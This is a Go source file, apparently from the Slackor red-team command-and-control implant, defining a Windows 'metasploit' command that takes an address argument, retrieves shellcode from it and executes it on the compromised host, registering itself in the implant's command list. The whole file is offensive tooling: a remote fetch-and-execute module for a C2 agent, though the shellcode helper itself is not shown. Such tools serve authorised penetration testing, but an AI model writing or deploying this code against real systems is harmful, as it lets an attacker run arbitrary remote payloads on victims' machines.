// +build windows

package windows

import (
	"errors"
	"runtime"

	"github.com/Coalfire-Research/Slackor/pkg/command"
)

// Metasploit retrieves shellcode and executes it
type Metasploit struct{}

// Name is the name of the command
func (m Metasploit) Name() string {
	return "metasploit"
}

// Run retrieves shellcode and executes it
func (m Metasploit) Run(clientID string, jobID string, args []string) (string, error) {
	if len(args) != 1 {
		return "", errors.New("shellcode takes 1 argument")
	}
	if runtime.GOARCH != "386" {
		address := args[0]
		err := shellcode(address, true)
		if err != nil {
			return "", err
		}
	} else {
		return "", errors.New("shellcode module does not work on 32-bit agents")
	}
	return "Shellcode executed.", nil
}

func init() {
	command.RegisterCommand(Metasploit{})
}
